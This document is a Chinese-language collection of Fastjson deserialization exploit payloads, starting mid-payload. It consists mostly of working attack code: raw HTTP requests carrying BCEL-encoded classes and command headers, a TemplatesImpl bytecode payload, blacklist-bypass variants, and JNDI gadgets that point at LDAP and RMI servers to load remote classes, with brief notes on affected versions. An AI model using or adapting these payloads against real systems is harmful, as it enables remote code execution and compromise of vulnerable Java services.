7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\" } }: \"x\" } POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: ver && echo fastjson Content - Length : 3327 { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\" } }: \"x\" } 1.2.33 <= fastjson <= 1.2.47 \u00b6 POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: whoami Content - Length : 3647 { \"xx\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\" } } : \"xxx\" } } 1.2.33<=fastjson<=12.36 { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL...\" } } : \"ddd\" } } 1.2.37<=fastjson<=1.2.47 { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" }, \"x\" : { \"name\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"y\" : { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"c\" : { \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$..\" , \"$ref\" : \"$.x.y.c.connection\" } } } } \u5176\u4ed6 { \"@type\" : \"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\" , \"key\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driver\" : \"$$BCEL$$xxxxxxx\" } TemplatesImpl \u00b6 \u5229\u7528\u6761\u4ef6\u82db\u523b\uff0c\u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 \u9700\u8981\u8c03\u7528 parseObject() \u65b9\u6cd5\u65f6\uff0c\u52a0\u5165Feature.SupportNonPublicField\u53c2\u6570\u3002 _bytecodes\u8981\u8fdb\u884cbase64\u7f16\u7801 { \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" , \"_bytecodes\" : [ \"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==\" ] , \"_name\" : \"a.b\" , \"_tfactory\" :{ }, \"_outputProperties\" :{ }, \"_version\" : \"1.0\" , \"allowedProtocols\" : \"all\" } c3p0#WrapperConnectionPoolDataSource \u00b6 \u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 fastjson <1.2.47 \u5229\u7528c3p0\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316 cc payload\u5230\u8fbe\u56de\u663e\u3002 POST / json HTTP / 1.1 Host: 127.0.0.1 : 8999 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5.0 ( Windows NT 10.0 ; Win64 ; x64 ) AppleWebKit / 537.36 ( KHTML , like Gecko ) Chrome / 75.0.3770.142 Safari / 537.36 Accept: text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / webp , image / apng , */* ; q = 0.8 , application / signed - exchange ; v = b3 Accept - Encoding : gzip , deflate cmd: dir Accept - Language : zh - CN , zh ; q = 0.9 Connection: close Content - Type : application / json Content - Length : 8925 { \"e\" :{ \"@type\" : \"java.lang.Class\" , \"val\" : \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"f\" :{ \"@type\" : \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" , \"userOverridesAsString\" : \"HexAsciiSerializedMap}} Fastjson 1.2.25-1.2.41 \u00b6 1.2.25\u540e\u5c06TypeUtils.loadClass\u66ff\u6362\u4e3acheckAutoType()\u51fd\u6570\uff0c\u589e\u52a0\u4e86\u9ed1\u540d\u5355\u548c\u767d\u540d\u5355\u3002 \u628aautoTypeSupport\u9ed8\u8ba4\u4e3aFalse\u3002 \u5f53autoTypeSupport\u4e3aFalse\u65f6\uff0c\u5148\u9ed1\u540d\u5355\u8fc7\u6ee4\uff0c\u518d\u767d\u540d\u5355\u8fc7\u6ee4\uff0c\u82e5\u767d\u540d\u5355\u5339\u914d\u4e0a\u5219\u76f4\u63a5\u52a0\u8f7d\u8be5\u7c7b\uff0c\u5426\u5219\u62a5\u9519\u3002 \u5f53autoTypeSupport\u4e3aTrue\u65f6\uff0c\u5148\u767d\u540d\u5355\u8fc7\u6ee4\uff0c\u5339\u914d\u6210\u529f\u5373\u53ef\u52a0\u8f7d\u8be5\u7c7b\uff0c\u5426\u5219\u518d\u9ed1\u540d\u5355\u8fc7\u6ee4\u3002 1.2.25\u9ed1\u540d\u5355 bsh com . mchange com . sun . java . lang . Thread java . net . Socket java . rmi javax . xml org . apache . bcel org . apache . commons . beanutils org . apache . commons . collections . Transformer org . apache . commons . collections . functors org . apache . commons . collections4 . comparators org . apache . commons . fileupload org . apache . myfaces . context . servlet org . apache . tomcat org . apache . wicket . util org . codehaus . groovy . runtime org . hibernate org . jboss org . mozilla . javascript org . python . core org . springframework exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u7c7b\u540d\u524d\u9762\u52a0\u4e86\u4e00\u4e2aL\uff0c\u540e\u9762\u52a0\u4e00\u4e2a;\u53ef\u4ee5\u7ed5\u8fc7\u9ed1\u540d\u5355 { \"@type\" : \"Lcom.sun.rowset.JdbcRowSetImpl;\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true } Fastjson 1.2.25-1.2.42 \u00b6 \u4ece1.2.42\u7248\u672c\u5f00\u59cb,\u628a\u4e4b\u524d\u7684\u660e\u6587\u9ed1\u540d\u5355\uff0c\u6539\u4e3ahash\u9ed1\u540d\u5355\u3002 \u5982\u4e0b\u5927\u4f6c\u6574\u7406\u7684 https://github.com/LeadroyaL/fastjson-blacklist exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u53cc\u5199\u7ed5\u8fc7 { \"@type\" : \"LLcom.sun.rowset.JdbcRowSetImpl;;\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true } Fastjson 1.2.25-1.2.43 \u00b6 exp \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype \u52a0[{\u7ed5\u8fc7 { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [ {, \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true } Fastjson 1.2.25-1.2.45 \u00b6 \u6761\u4ef6\u9700\u8981\u5f00\u542fautotype 45\u628a\u4e4b\u524d\u95ee\u9898\u4fee\u4e86\uff0c\u4f46\u662f\u53ef\u4ee5\u501f\u52a9\u7b2c\u4e09\u65b9\u7ec4\u4ef6\u7ed5\u8fc7\u3002 \u9700\u8981mybatis\uff0c\u4e14\u7248\u672c\u9700\u4e3a3.x.x\u7cfb\u5217<3.5.0\u7684\u7248\u672c\u3002 { \"@type\" : \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\" , \"properties\" :{ \"data_source\" : \"ldap://localhost:1389/badNameClass\" }} Fastjson1.2.25-1.2.47\u901a\u6740 \u00b6 \u501f\u52a9\u7f13\u5b58\u8fdb\u884c\u901a\u6740\uff0c\u7f13\u5b58\u57281.2.48\u88ab\u6539\u4e3a\u9ed8\u8ba4\u5173\u95ed \u6f0f\u6d1e\u539f\u7406\u662f\u901a\u8fc7java.lang.Class\uff0c\u5c06JdbcRowSetImpl\u7c7b\u52a0\u8f7d\u5230Map\u4e2d\u7f13\u5b58\uff0c\u4ece\u800c\u7ed5\u8fc7AutoType\u7684\u68c0\u6d4b \u8fd9\u91cc\u6709\u4e24\u5927\u7248\u672c\u8303\u56f4\uff1a 1.2.25-1.2.32\u7248\u672c\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u4e0d\u80fd\u5229\u7528 1.2.33-1.2.47\u7248\u672c\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528 poc: { \"a\" :{ \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\" :{ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://localhost:1389/badNameClass\" , \"autoCommit\" : true } } 1.2.48\u4e4b\u540e\u7248\u672c\uff0c\u5c0f\u5f1f\u6c34\u5e73\u6709\u9650\u8fd8\u672a\u590d\u73b0\u7814\u7a76\uff0cpayload\u9700\u8981\u6ce8\u610f\u7684\u7ec6\u8282\u8fd8\u672a\u63a2\u7d22 Fastjson1.2.5 <= 1.2.59 \u00b6 \u9700\u8981\u5f00\u542fAutoType { \"@type\" : \"com.zaxxer.hikari.HikariConfig\" , \"metricRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"com.zaxxer.hikari.HikariConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" } Fastjson1.2.5 <= 1.2.60 \u00b6 \u65e0\u9700\u5f00\u542f autoType\uff1a { \"@type\" : \"oracle.jdbc.connector.OracleManagedConnectionFactory\" , \"xaDataSourceName\" : \"rmi://10.10.20.166:1099/ExportObject\" } { \"@type\" : \"org.apache.commons.configuration.JNDIConfiguration\" , \"prefix\" : \"ldap://10.10.20.166:1389/ExportObject\" } Fastjson1.2.5 <= 1.2.61 \u00b6 { \"@type\" : \"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\" , \"jndiName\" : \"ldap://localhost:1389/Exploit\" , \"Object\" : \"a\" } Fastjson <1.2.62 \u00b6 